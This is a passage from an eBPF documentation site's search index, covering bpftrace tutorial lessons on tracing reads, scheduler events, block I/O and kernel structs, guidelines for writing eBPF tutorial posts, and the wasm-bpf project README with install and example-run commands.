probes...\n\n[...]\n@ns[snmp-pass]:\n[0, 1]                 0 |                                                    |\n[2, 4)                 0 |                                                    |\n[4, 8)                 0 |                                                    |\n[8, 16)                0 |                                                    |\n[16, 32)               0 |                                                    |\n[32, 64)               0 |                                                    |\n[64, 128)              0 |                                                    |\n[128, 256)             0 |                                                    |\n[256, 512)            27 |@@@@@@@@@                                           |\n[512, 1k)            125 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@       |\n[1k, 2k)              22 |@@@@@@@                                             |\n[2k, 4k)               1 |                                                    |\n[4k, 8k)              10 |@@@                                                 |\n[8k, 16k)              1 |                                                    |\n[16k, 32k)             3 |@                                                   |\n[32k, 64k)           144 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|\n[64k, 128k)            7 |@@                                                  |\n[128k, 256k)          28 |@@@@@@@@@@                                          |\n[256k, 512k)           2 |                                                    |\n[512k, 1M)             3 |@                                                   |\n[1M, 2M)               1 |                                                    |\n</code></pre> <p>Summarize the time spent in read(), in nanoseconds, as a histogram, by process name.</p> <ul> <li>@start[tid]: This uses the thread ID as a key. There may be many reads in-flight, and we want to store a start timestamp to each. How? We could construct a unique identifier for each read, and use that as the key. But because kernel threads can only be executing one syscall at a time, we can use the thread ID as the unique identifier, as each thread cannot be executing more than one.</li> <li>nsecs: Nanoseconds since boot. This is a high resolution timestamp counter than can be used to time events.</li> <li> <p>/@start[tid]/: This filter checks that the start time was seen and recorded. Without this filter, this program may be launched during a read and only catch the end, resulting in a time calculation of now - zero, instead of now - start.</p> </li> <li> <p>delete(@start[tid]): this frees the variable.</p> </li> </ul>"},{"location":"tutorials/bpftrace-tutorial/#lesson-8-count-process-level-events","title":"Lesson 8. Count Process-Level Events","text":"<pre><code># bpftrace -e 'tracepoint:sched:sched* { @[probe] = count(); } interval:s:5 { exit(); }'\nAttaching 25 probes...\n@[tracepoint:sched:sched_wakeup_new]: 1\n@[tracepoint:sched:sched_process_fork]: 1\n@[tracepoint:sched:sched_process_exec]: 1\n@[tracepoint:sched:sched_process_exit]: 1\n@[tracepoint:sched:sched_process_free]: 2\n@[tracepoint:sched:sched_process_wait]: 7\n@[tracepoint:sched:sched_wake_idle_without_ipi]: 53\n@[tracepoint:sched:sched_stat_runtime]: 212\n@[tracepoint:sched:sched_wakeup]: 253\n@[tracepoint:sched:sched_waking]: 253\n@[tracepoint:sched:sched_switch]: 510\n</code></pre> <p>Count process-level events for five seconds, printing a summary.</p> <ul> <li>sched: The <code>sched</code> probe category has high-level scheduler and process events, such as fork, exec, and context switch.</li> <li>probe: The full name of the probe.</li> <li>interval:s:5: This is a probe that fires once every 5 seconds, on one CPU only. It is used for creating script-level intervals or timeouts.</li> <li>exit(): This exits bpftrace.</li> </ul>"},{"location":"tutorials/bpftrace-tutorial/#lesson-9-profile-on-cpu-kernel-stacks","title":"Lesson 9. Profile On-CPU Kernel Stacks","text":"<pre><code># bpftrace -e 'profile:hz:99 { @[kstack] = count(); }'\nAttaching 1 probe...\n^C\n\n[...]\n@[\nfilemap_map_pages+181\n__handle_mm_fault+2905\nhandle_mm_fault+250\n__do_page_fault+599\nasync_page_fault+69\n]: 12\n[...]\n@[\ncpuidle_enter_state+164\ndo_idle+390\ncpu_startup_entry+111\nstart_secondary+423\nsecondary_startup_64+165\n]: 22122\n</code></pre> <p>Profile kernel stacks at 99 Hertz, printing a frequency count.</p> <ul> <li>profile:hz:99: This fires on all CPUs at 99 Hertz. Why 99 and not 100 or 1000? We want frequent enough to catch both the big and small picture of execution, but not too frequent as to perturb performance. 100 Hertz is enough. But we don't want 100 exactly, as sampling may occur in lockstep with other timed activities, hence 99.</li> <li>kstack: Returns the kernel stack trace. This is used as a key for the map, so that it can be frequency counted. The output of this is ideal to be visualized as a flame graph. There is also <code>ustack</code> for the user-level stack trace.</li> </ul>"},{"location":"tutorials/bpftrace-tutorial/#lesson-10-scheduler-tracing","title":"Lesson 10. Scheduler Tracing","text":"<pre><code># bpftrace -e 'tracepoint:sched:sched_switch { @[kstack] = count(); }'\n^C\n[...]\n\n@[\n__schedule+697\n__schedule+697\nschedule+50\nschedule_timeout+365\nxfsaild+274\nkthread+248\nret_from_fork+53\n]: 73\n@[\n__schedule+697\n__schedule+697\nschedule_idle+40\ndo_idle+356\ncpu_startup_entry+111\nstart_secondary+423\nsecondary_startup_64+165\n]: 305\n</code></pre> <p>This counts stack traces that led to context switching (off-CPU) events. The above output has been truncated to show the last two only.</p> <ul> <li>sched: The sched category has tracepoints for different kernel CPU scheduler events: sched_switch, sched_wakeup, sched_migrate_task, etc.</li> <li>sched_switch: This probe fires when a thread leaves CPU. This will be a blocking event: eg, waiting on I/O, a timer, paging/swapping, or a lock.</li> <li>kstack: A kernel stack trace.</li> <li>sched_switch fires in thread context, so that the stack refers to the thread who is leaving. As you use other probe types, pay attention to context, as comm, pid, kstack, etc, may not refer to the target of the probe.</li> </ul>"},{"location":"tutorials/bpftrace-tutorial/#lesson-11-block-io-tracing","title":"Lesson 11. Block I/O Tracing","text":"<pre><code># bpftrace -e 'tracepoint:block:block_rq_issue { @ = hist(args.bytes); }'\nAttaching 1 probe...\n^C\n\n@:\n[0, 1]                 1 |@@                                                  |\n[2, 4)                 0 |                                                    |\n[4, 8)                 0 |                                                    |\n[8, 16)                0 |                                                    |\n[16, 32)               0 |                                                    |\n[32, 64)               0 |                                                    |\n[64, 128)              0 |                                                    |\n[128, 256)             0 |                                                    |\n[256, 512)             0 |                                                    |\n[512, 1K)              0 |                                                    |\n[1K, 2K)               0 |                                                    |\n[2K, 4K)               0 |                                                    |\n[4K, 8K)              24 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|\n[8K, 16K)              2 |@@@@                                                |\n[16K, 32K)             6 |@@@@@@@@@@@@@                                       |\n[32K, 64K)             5 |@@@@@@@@@@                                          |\n[64K, 128K)            0 |                                                    |\n[128K, 256K)           1 |@@                                                  |\n</code></pre> <p>Block I/O requests by size in bytes, as a histogram.</p> <ul> <li>tracepoint:block: The block category of tracepoints traces various block I/O (storage) events.</li> <li>block_rq_issue: This fires when an I/O is issued to the device.</li> <li>args.bytes: This is a member from the tracepoint block_rq_issue arguments which shows the size in bytes.</li> </ul> <p>The context of this probe is important: this fires when the I/O is issued to the device. This often happens in process context, where builtins like comm will show you the process name, but it can also happen from kernel context (eg, readahead) when the pid and comm will not show the application you expect.</p>"},{"location":"tutorials/bpftrace-tutorial/#lesson-12-kernel-struct-tracing","title":"Lesson 12. Kernel Struct Tracing","text":"<pre><code># cat path.bt\n#ifndef BPFTRACE_HAVE_BTF\n#include &lt;linux/path.h&gt;\n#include &lt;linux/dcache.h&gt;\n#endif\n\nkprobe:vfs_open\n{\n    printf(\"open path: %s\\n\", str(((struct path *)arg0)-&gt;dentry-&gt;d_name.name));\n}\n\n# bpftrace path.bt\nAttaching 1 probe...\nopen path: dev\nopen path: if_inet6\nopen path: retrans_time_ms\n[...]\n</code></pre> <p>This uses kernel dynamic tracing of the vfs_open() function, which has a (struct path *) as the first argument.</p> <ul> <li>kprobe: As mentioned earlier, this is the kernel dynamic tracing probe type, which traces the entry of kernel functions (use kretprobe to trace their returns).</li> <li><code>arg0</code> is a builtin variable containing the first probe argument, the meaning of which is defined by the probe type. For <code>kprobe</code>, it is the first argument to the function. Other arguments can be accessed as arg1, ..., argN.</li> <li><code>((struct path *)arg0)-&gt;dentry-&gt;d_name.name</code>: this casts <code>arg0</code> as <code>struct path *</code>, then dereferences dentry, etc.</li> <li> </li> </ul> <p>The kernel struct support is the same as bcc, making use of kernel headers. This means that many structs are available, but not everything, and sometimes it might be necessary to manually include a struct. For an example of this, see the dcsnoop tool, which includes a portion of struct nameidata manually as it wasn't in the available headers. If the kernel has BTF data, all kernel structs are always available.</p> <p>At this point you understand much of bpftrace, and can begin to use and write powerful one-liners. See the Reference Guide for more capabilities.</p> <p>The original tutorial link: https://github.com/iovisor/bpftrace/blob/master/docs/</p> <p>Share on  Share on </p>"},{"location":"tutorials/bpftrace-tutorial/#include-these-are-necessary-to-include-struct-definitions-for-path-and-dentry-on-systems-where-the-kernel-was-built-without-btf-bpf-type-format-data","title":"include: these are necessary to include struct definitions for path and dentry on systems where the kernel was built without BTF  (BPF Type Format) data.","text":""},{"location":"tutorials/scripts/guideline_advance/","title":"Blog Guidelines for Advanced eBPF Tutorials","text":"<p>This document outlines the key patterns and requirements for writing advanced eBPF tutorials. Advanced tutorials focus on complex eBPF programs, tools, or features that extend beyond basic concepts. They require a deeper understanding of eBPF and kernel interactions.</p> <p>The audience for advanced tutorials includes developers, system administrators, and security professionals with intermediate to advanced eBPF knowledge. The goal is to provide in-depth explanations of advanced eBPF topics and practical examples that readers can apply in real-world scenarios.</p> <p>The key point in tone: Using oral English, clear and simple words and short sentence, make it attractive and easy to read, do not make it like a paper. Not too much fancy words, try to be attracive.</p> <p>You should also include all the details and information I provide to you. do not simplify or change any of them, you just need to regorganize them in a more attractive way as a tutorial blog.</p>"},{"location":"tutorials/scripts/guideline_advance/#starting-with-a-clear-and-descriptive-title","title":"starting with a clear and descriptive title","text":"<p>Begin with a clear and descriptive title:</p> <pre><code># eBPF Tutorial by Example: [Advanced Topic]\n</code></pre> <p>Kick off with a brief intro to the advanced eBPF topic you're covering, and the example or tool you'll discuss. Highlight its significance and how it extends beyond basic concepts. Let readers know what they'll learn and why it's important.</p>"},{"location":"tutorials/scripts/guideline_advance/#incroduction-to-the-concept-tool-and-background","title":"Incroduction to the concept, tool and Background","text":"<p>(Come up with a better session title)</p> <p>Provide an overview of the specific eBPF programs, tools, or features you'll discuss. Explain their purpose, use cases, and the key eBPF features or kernel events involved. Focus on aspects that are crucial for advanced understanding.</p>"},{"location":"tutorials/scripts/guideline_advance/#high-level-code-analysis","title":"High-Level Code Analysis","text":"<p>Dive into the kernel-mode eBPF code and user-space code, focusing on high-level concepts rather than basic syntax.</p> <p>Always include the full code as it is first. then break down the key parts.</p> <p>Try to avoid using too much list, make it more like a story.</p> <p>Follow the steps:</p> <ol> <li>First, introduce The overall processing logic in both kernel and user space.</li> <li> <p>Then break down the kernel-mode eBPF code, include</p> </li> <li> <p>How the eBPF program is structured.</p> </li> <li>Key eBPF functionalities utilized.</li> <li>How the code interacts with kernel events.</li> </ol> <p>Do not make them a list, make them some paragraphs, you can also quote some code snippets to explain the key parts of the code if needed, focus on the logic and features used in advanced eBPF development. Don't make it too long, but make sure it is informative enough and you explain everything a advanced eBPF developer wants to know.</p> <ol> <li>Then briefly explain the user-space code</li> </ol> <p>Aim to help readers grasp how the code works without getting bogged down in basic details.</p>"},{"location":"tutorials/scripts/guideline_advance/#any-more-detailed-concepts-or-features-explanation","title":"Any more detailed concepts or features explanation","text":"<p>If there are other information or features that are important to understand the code, you can add them here.</p>"},{"location":"tutorials/scripts/guideline_advance/#5-compilation-and-execution","title":"5. Compilation and Execution","text":"<p>Provide instructions on compiling and running the eBPF programs, noting any advanced configurations or dependencies. Include commands and what readers should expect as output. Typically, you can run <code>make</code> in the relevant directory in the tutorial repository to build the code.</p> <p>Include links to complete source code and resources:</p> <ul> <li>Repository: https://github.com/eunomia-bpf/bpf-developer-tutorial</li> <li>Website: https://eunomia.dev/tutorials/</li> </ul>"},{"location":"tutorials/scripts/guideline_advance/#6-summary-and-call-to-action","title":"6. Summary and Call to Action","text":"<p>Wrap up by summarizing the key points. Emphasize the advanced concepts covered and encourage readers to apply this knowledge. Invite them to explore more examples and tutorials, as one paragraph:</p> <p>If you'd like to dive deeper into eBPF, check out our tutorial repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or visit our website at https://eunomia.dev/tutorials/.</p>"},{"location":"tutorials/scripts/guideline_advance/#reference","title":"reference","text":"<p>You should include the important references and resources that used in the tutorial. If this is from other sources like kernel sample or tools, make sure to include them here and clearly mention them in the tutorial.</p>"},{"location":"tutorials/scripts/guideline_advance/#additional-guidelines","title":"Additional Guidelines","text":"<ul> <li>Clarity: Use simple language and short sentences to explain complex ideas. But the information should be complete and detailed.</li> <li>Focus on Advanced Concepts: Assume readers have basic eBPF knowledge; skip elementary explanations.</li> <li>Engagement: Encourage readers to think critically and engage with the material.</li> <li>Consistency: Keep a consistent style and formatting throughout.</li> <li>Code Formatting: Ensure code snippets are well-formatted and highlight key parts. Do not change or simplify any of the code and commands, keep them as they are.</li> <li>Proofreading: Double-check for errors and ensure technical accuracy.</li> <li>Accessibility: Make the content valuable for readers with advanced expertise, avoiding unnecessary simplifications.</li> </ul> <p>Share on  Share on </p>"},{"location":"tutorials/scripts/guideline_basic/","title":"blog guideline or pattern","text":""},{"location":"tutorials/scripts/guideline_basic/#key-pattern-and-requirements-for-ebpf-tutorial-blog-posts","title":"Key Pattern and Requirements for eBPF Tutorial Blog Posts","text":""},{"location":"tutorials/scripts/guideline_basic/#1-title","title":"1. Title","text":"<ul> <li>Begin with a clear and descriptive title, following the format:</li> </ul> <pre><code># eBPF Tutorial by Example: [Topic Description]\n</code></pre> <p>Example:</p> <pre><code># eBPF Tutorial by Example: Recording TCP Connection Status and TCP RTT\n</code></pre> <ul> <li>Or slightly different</li> </ul> <pre><code># eBPF Developer Tutorial: [Topic Description]\n</code></pre>"},{"location":"tutorials/scripts/guideline_basic/#2-introduction-and-background","title":"2. Introduction and background","text":"<ul> <li>Start with a brief introduction to eBPF, explaining its significance and capabilities.</li> <li>Provide context for the tutorial's focus, mentioning the specific tools, example or use cases that will be covered.</li> <li>Goal: Help readers understand what they will learn and why it's important.</li> </ul>"},{"location":"tutorials/scripts/guideline_basic/#3-overview-of-the-tools-examples-or-features-or-what-we-are-describing-in-this-tutorial","title":"3. Overview of the Tools, Examples or features or what we are describing in this tutorial","text":"<p>Think of a better subtitle related to this part.</p> <ul> <li>Introduce the specific eBPF programs or tools that will be discussed.</li> <li>Explain their purpose and how they can help you, their usecase or why you need them.</li> <li>What key eBPF feature or kernel events is used or related? Only discuss important ones, but should be detailed</li> <li>Goal: Give readers a clear understanding of what each tool does.</li> </ul> <p>Note that it might not always be a tool. Might be examples or others.</p>"},{"location":"tutorials/scripts/guideline_basic/#4-kernel-ebpf-code-analysis","title":"4. Kernel eBPF Code Analysis","text":"<ul> <li>Present the kernel-mode eBPF code related to the tools.</li> <li>Include code snippets with proper formatting for readability.</li> <li>if not too long, include the full code first.</li> <li>Provide detailed explanations of key sections in the code.</li> <li>for example:</li> <li>Define BPF Maps: Explain the maps used and their purposes.</li> <li>Events: Describe how the code attaches to kernel events.</li> <li>Logic: Explain how the processing in kernel happens</li> <li>Features: introduce used features in eBPF</li> <li>Goal: Help readers understand how the eBPF code works internally.</li> </ul>"},{"location":"tutorials/scripts/guideline_basic/#5-user-space-code-analysis","title":"5. User-Space Code Analysis","text":"<ul> <li>Present the user-space code that interacts with the eBPF program.</li> <li>if not too long, include the full code first.</li> <li>Include code snippets and explain how the user-space application processes data from the eBPF program.</li> <li>for example:</li> <li>Event Handling: Describe how events are received and processed.</li> <li>Data Presentation: Explain how data is formatted and displayed to the user.</li> <li>Goal: Show how the eBPF program communicates with user-space and how to interpret the results.</li> </ul>"},{"location":"tutorials/scripts/guideline_basic/#6-compilation-and-execution-instructions","title":"6. Compilation and Execution Instructions","text":"<ul> <li>Provide step-by-step instructions on how to compile and run the eBPF programs.</li> <li>Include commands and expected outputs.</li> <li>Mention any prerequisites or dependencies required.</li> <li>Compiling the eBPF Program: Commands and explanations.</li> <li>Running the User-Space Application: How to execute and interpret outputs.</li> <li>Goal: Enable readers to replicate the examples on their own systems.</li> </ul> <p>You need to provide Complete Source Code and Resources link in ompilation and Execution Instructions.</p> <ul> <li>Provide links to the complete source code repositories.</li> <li>Include references to related tools, documentation, or tutorials.</li> <li>Source Code: Direct links to GitHub or relevant repositories.</li> <li>References: List of resources for further reading.</li> <li>Goal: Offer additional resources for readers to explore more deeply.</li> </ul> <p>The repo is in https://github.com/eunomia-bpf/bpf-developer-tutorial, website at https://eunomia.dev/tutorials/. Typically you can run <code>make</code> in the related fir, such as <code>bpf-developer-tutorial/src/41-xdp-tcpdump</code> to build it.</p>"},{"location":"tutorials/scripts/guideline_basic/#7-summary-and-conclusion","title":"7. Summary and Conclusion","text":"<ul> <li>Summarize the key points covered in the tutorial.</li> <li>Emphasize the importance of the tools and concepts learned.</li> <li>Encourage readers to apply this knowledge and explore further.</li> <li>Goal: Reinforce learning outcomes and inspire continued learning.</li> </ul> <p>You need to have Call to Action in Summary and Conclusion</p> <ul> <li>Invite readers to visit your tutorial repository and website for more examples and complete tutorials.</li> <li> <p>Provide links to the main tutorial site and any relevant sections. The link should be show directly.</p> </li> <li> <p>Example:</p> </li> </ul> <pre><code>If you would like to learn more about eBPF, visit our tutorial code repository at &lt;https://github.com/eunomia-bpf/bpf-developer-tutorial&gt; or our website at &lt;https://eunomia.dev/tutorials/&gt;.\n</code></pre>"},{"location":"tutorials/scripts/guideline_basic/#additional-guidelines","title":"Additional Guidelines","text":"<ul> <li>Consistency: Maintain a consistent writing style and formatting across all blog posts.</li> <li>Clarity: Use clear and concise language to explain complex concepts.</li> <li>Code Formatting: Ensure all code snippets are properly formatted and syntax-highlighted for readability.</li> <li>Visual Aids: Include diagrams or charts if they help in explaining concepts better.</li> <li>Audience Engagement: Pose questions or scenarios that encourage readers to think and engage with the material.</li> <li>Proofreading: Check for grammatical errors and ensure technical accuracy.</li> <li>Accessibility: Make sure that the tutorials are accessible to readers with varying levels of expertise in eBPF.</li> </ul> <p>Also, do not just list points, try to make it using paragraph unless points list is clear. </p> <p>The key point in tone: Using oral English, clear and simple words and short sentence, make it attractive and easy to read, do not make it like a paper. Not too much fancy words, try to be attracive.</p> <p>Share on  Share on </p>"},{"location":"wasm-bpf/","title":"\ud83d\udce6 Wasm-bpf: Wasm library and toolchain for eBPF","text":"<p>Gitee Github</p> <p><code>Wasm-bpf</code> is a WebAssembly eBPF library, toolchain and runtime powered by CO-RE(Compile Once \u2013 Run Everywhere) libbpf. It can help you build almost every eBPF programs or usecases to <code>Wasm</code> with nearly zero modification, and run them cross platforms with Wasm sandbox.</p>"},{"location":"wasm-bpf/#quick-start-guides","title":"Quick start guides","text":"<p>\u2328\ufe0f Introduction to wasm-bpf \\ \ud83d\udce6 Features \\ \ud83d\ude80 Running a standalone Wasm program from CLI or Docker \\ \ud83d\udd0c Embed a Wasm-eBPF function in your Rust program or C/C++ program  \\ \ud83d\udd28 Examples covering the use cases from <code>tracing</code>, <code>networking</code> to <code>security</code> \\ \ud83d\udcda How it works \\ \ud83e\udd16 Build the runtime</p> <p>\ud83d\udcda Check out our more documentations</p>"},{"location":"wasm-bpf/#introduction","title":"\u2328\ufe0f Introduction","text":"<p><code>WebAssembly</code> (Wasm) is a portable binary format for executable code. The code is executed at a nearly-native speed in a memory-safe (for host) sandbox, with clearly defined resource constraints, and APIs for communicating with the embedding host environment (eg. proxy).The <code>wasm-bpf</code> project combines Wasm and eBPF technologies to enhance the performance and programmability of eBPF applications.</p> <p>With <code>wasm-bpf</code>, users can dynamically load and securely execute user-defined or community-contributed Wasm-eBPF codes as <code>plug-ins</code> in their software products, such as observability platforms or service proxy. This enables efficient and scalable data collection, while also allowing for advanced processing and analysis of that data.</p> <p>It also enables developers to write eBPF programs in familiar languages like <code>C/C++</code>, <code>Rust</code>, <code>Go</code>, and more than 30 other programming languages, and deploy them easily across different Linux distributions. Additionally, cloud providers can leverage wasm-bpf to offer a <code>secure</code> and <code>high-performance</code> environment for their customers to develop and deploy eBPF applications in their cloud environments.</p>"},{"location":"wasm-bpf/#get-started","title":"\ud83d\ude80 Get started","text":""},{"location":"wasm-bpf/#install-wasm-bpf","title":"\ud83d\udce6 Install wasm-bpf","text":"<p>Run the following command to install the <code>wasm-bpf</code> CLI tool:</p> <pre><code>cargo install wasm-bpf \n</code></pre>"},{"location":"wasm-bpf/#running-a-standalone-wasm-ebpf-program","title":"Running a standalone Wasm-eBPF program","text":"<p>Running the <code>runqlat</code> example with docker:</p> <pre><code>$ wget https://eunomia-bpf.github.io/wasm-bpf/examples/runqlat/runqlat.wasm\n$ docker run --rm -it --privileged -v $(pwd):/examples ghcr.io/eunomia-bpf/wasm-bpf:latest /examples/runqlat.wasm\nTracing run queue latency... Hit Ctrl-C to end.\n\n     usecs               : count    distribution\n         0 -&gt; 1          : 72       |*****************************           |\n         2 -&gt; 3          : 93       |*************************************   |\n         4 -&gt; 7          : 98       |****************************************|\n         8 -&gt; 15         : 96       |*************************************** |\n        16 -&gt; 31         : 38       |***************                         |\n        32 -&gt; 63         : 4        |*                                       |\n        64 -&gt; 127        : 5        |**                                      |\n       128 -&gt; 255        : 6        |**                                      |\n       256 -&gt; 511        : 0        |                                        |\n       512 -&gt; 1023       : 0        |                                        |\n      1024 -&gt; 2047       : 0        |                                        |\n      2048 -&gt; 4095       : 1        |                                        |\n</code></pre> <p>For more tools to distribute and deploy Wasm-eBPF programs for usecases from <code>Observability</code>, <code>Networking</code> to <code>Security</code>, please refer to eunomia-bpf repo.</p>"},{"location":"wasm-bpf/#embed-a-wasm-ebpf-function-in-your-program","title":"Embed a Wasm-eBPF function in your program","text":"<p>Add the following line to your Cargo.toml to use Wasm-bpf as a <code>library</code>:</p> <pre><code>wasm-bpf-rs = \"0.2.2\"\n</code></pre>"},{"location":"wasm-bpf/#features","title":"Features","text":"<ul> <li><code>General purpose</code>: provide most abilities from eBPF to Wasm, <code>polling</code> from the ring buffer or perf buffer, bidirectional communications between <code>kernel</code> eBPF and <code>userspace</code> Wasm using <code>maps</code>, dynamically <code>loading</code>, <code>attaching</code> or <code>detaching</code>, etc. Supports a large number of eBPF program types and map types.</li> <li><code>High performance</code>: No <code>serialization</code> overhead for complex data types, using <code>shared memory</code> to avoid copy overhead between host and Wasm.</li> <li><code>Easy to use</code>: provide a similar developing experience as the libbpf-bootstrap, <code>auto generate</code> the Wasm-eBPF skeleton headers and type definitions for bindings. Write your eBPF programs in <code>C/C++</code>, <code>Rust</code>, <code>Go</code> and compile to Wasm.</li> <li><code>Ultralightweight</code>: the miminal runtime has only <code>1.5 MB</code> in binary size. Compiled Wasm module would be only <code>~90K</code>. With the same toolchain, you can easily build your own Wasm-eBPF runtime in any languages and platforms!</li> </ul> <p>See the examples directory for examples of eBPF programs written in C, Rust, Go and compiled to Wasm, covering the use cases from <code>tracing</code>, <code>networking</code> to <code>security</code>.</p> <p>For tools to distribute Wasm-eBPF programs in <code>OCI</code> images, please refer to eunomia-bpf repo.</p>"},{"location":"wasm-bpf/#examples","title":"Examples","text":"<p>See the examples directory for examples of eBPF programs written in C, Rust, Go and compiled to WASM.</p> <p><code>tracing examples</code> - bootstrap and rust-bootstrap: trace process exec and exit - runqlat: summarizes scheduler run queue latency as a histogram - execve and go-execve: trace execve syscall</p> <p><code>security example</code> - lsm and  go-lsm: check the permission to remove a directory</p> <p><code>networking example</code> - sockfilter: monitoring packet and dealing with <code>__sk_buff</code>. - sockops: Add the pid int tcp option in syn packet.</p>"},{"location":"wasm-bpf/#how-it-works","title":"How it works","text":"<p>An eBPF application typically consists of two parts: the <code>user space part</code> and <code>the kernel space part</code>. With wasm-bpf, the user space part is executed in a WebAssembly (Wasm) sandbox while the kernel space part is executed in the eBPF runtime in the Linux kernel. This separation of concerns allows for greater flexibility and security in developing and running eBPF programs, as well as the ability to leverage the benefits of both Wasm and eBPF.</p> <p>The wasm-bpf runtime require two parts: <code>the host side</code>(Outside the Wasm runtime) and the <code>Wasm guest side</code>(Inside the Wasm runtime).</p> <ul> <li>host side: A simple runtime implementation example</li> <li>see runtime/cpp, which would be a sample runtime in <code>C++</code> built on the top of libbpf and WAMR. Another more complex runtime implement in <code>Rust</code> is runtime/wasm-bpf-rs, based on Wasmtime.</li> <li>You can easily build your own Wasm-eBPF runtime in <code>any</code> languages, <code>any</code> eBPF libraries and <code>any</code> Wasm runtimes with the same System interface.</li> <li>wasm side: toolchains and libraries</li> <li>a <code>libbpf-wasm</code> header only library to provide libbpf APIs for Wasm guest <code>C/C++</code> code.</li> <li>a <code>bpftool</code> tool to generate the Wasm-eBPF <code>skeleton</code> headers, and <code>C struct definitions</code> for passing data between the host and Wasm guest without serialization.</li> <li><code>Rust</code>, <code>Go</code> and other language support is similar to the <code>C/C++</code> support.</li> </ul> <p>For details compile process, please refer to the examples/bootstrap/README.md.  The figure below shows the overall interaction between the eBPF and Wasm runtimes:</p> <p></p> <p>A Wasm module could load and control multiple eBPF programs at the same time, and can call another Wasm module written in other languages to process the data or control with the component model.</p> <p>We have proposed a new WASI issue wasi-bpf.</p>"},{"location":"wasm-bpf/#build-the-runtime","title":"Build the runtime","text":"<p>We have two types of runtime samples:</p> <ul> <li>A C/C++ runtime example, which is a minimal runtime based on WAMR. see runtime/cpp for more details.</li> <li>A Rust runtime example, which is a more complex runtime based on Wasmtime. see runtime/wasm-bpf-rs for more details.</li> </ul> <p>The runtime can be built as a library or a standalone executable. see docs/build.md to build the runtimes.</p>"},{"location":"wasm-bpf/#use-nix","title":"Use Nix","text":"<p>This project has nix flake and direnv support. See: - direnv - Nix</p>"},{"location":"wasm-bpf/#license","title":"LICENSE","text":"<p>MIT LICENSE</p>"},{"location":"wasm-bpf/#links","title":"\ud83d\udd17 Links","text":"<ul> <li>eunomia-bpf project: simplify and enhance eBPF with CO-RE and WebAssembly https://github.com/eunomia-bpf/eunomia-bpf</li> <li>documents and blogs: https://docs.eunomia.dev</li> <li>CO-RE (Compile Once \u2013 Run Everywhere): https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html</li> <li>WAMR (WebAssembly Micro Runtime): https://github.com/bytecodealliance/wasm-micro-runtime</li> <li>libbpf: https://github.com/libbpf/libbpf</li> </ul> <p>Share on  Share on </p>"}]}